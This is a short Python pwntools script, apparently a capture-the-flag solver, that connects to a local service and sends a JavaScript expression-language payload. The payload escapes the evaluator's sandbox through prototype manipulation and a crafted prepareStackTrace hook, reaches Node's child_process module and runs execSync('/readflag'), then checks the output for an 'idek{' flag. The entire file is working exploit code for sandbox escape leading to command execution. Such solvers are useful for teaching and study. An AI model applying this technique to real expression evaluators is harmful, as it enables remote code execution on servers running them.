#!/usr/bin/env python3
import time
from pwn import remote

conn = remote("127.0.0.1", 1337)

time.sleep(0.5)

conn.sendline("""\
proto["#"] = "n";

cnt = 2;
switcher() = (cnt = cnt - 1) ? "name" : "constructor";
returnSwitcher(x) = switcher;

has(x) = true;

c = resolve('{ "toStri#g": switcher }');
c = c._compile({},{});
c = c({ has: has, get: returnSwitcher });

isObjectProperty() = true;
getObjectProperty() = c;
index(x) = { isObjectProperty: isObjectProperty, getObjectProperty: getObjectProperty };
has(x) = true;
get(x) = { "1": "" };
scope = { has: has, get: get };

acc = resolve("foo[0]")._compile({ index: index },{});
Object = acc(scope);

getOwn(obj, prop) = Object.getOwnPropertyDescriptor(obj, prop).value;

win2(load) = load("child_process").execSync("/readflag");
win(global) = global.console.log(win2( global.Reflect.get( global.Reflect.get( getOwn(  Object.getOwnPropertyDescriptors(global).process.get(), "mainModule"  ), "constructor" ), "_load" ) ).toString());

prepareStackTrace(x,y) = win(  getOwn(y,0).getThis()  );
proto.prepareStackTrace = prepareStackTrace;

Object.defineProperty(Object.getPrototypeOf([].toArray()), "push", { value: null });

""".replace("\n", "").encode())

# here it would be easier to just do conn.interactive() and tab for completer manually, but this needs to be automated
time.sleep(0.25)
conn.send(b"ang")
time.sleep(0.25)
conn.send(b"\t")
time.sleep(0.25)

res = conn.recvall().decode()
if "idek{" not in res:
    exit(1)
exit(0)
